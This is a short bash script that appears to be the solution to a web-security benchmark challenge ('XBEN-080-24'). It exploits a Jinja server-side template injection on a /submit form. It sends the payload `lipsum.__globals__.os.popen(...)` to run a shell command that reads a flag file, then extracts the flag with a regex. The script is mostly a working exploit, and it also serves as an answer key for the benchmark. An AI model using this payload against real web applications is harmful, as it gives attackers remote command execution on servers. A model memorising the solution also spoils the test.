#!/usr/bin/env bash
# XBEN-080-24 — "SWIFT Shipping & Transport Inc." (tags: ssti)
#
# `Template(f'Thank you {name} for your submission.')` — the name is put into
# the template *source* by an f-string and then compiled. Jinja's `Template` is
# not the sandboxed environment, so `lipsum.__globals__.os` reaches a shell.
#
# The `except` block returns the exception text, which is a small gift: a
# payload that half-works says why, rather than rendering an empty page.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben080-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/application" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/submit' \
    --set 'form.name={{lipsum.__globals__.os.popen("cat /FLAG.txt").read()}}' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
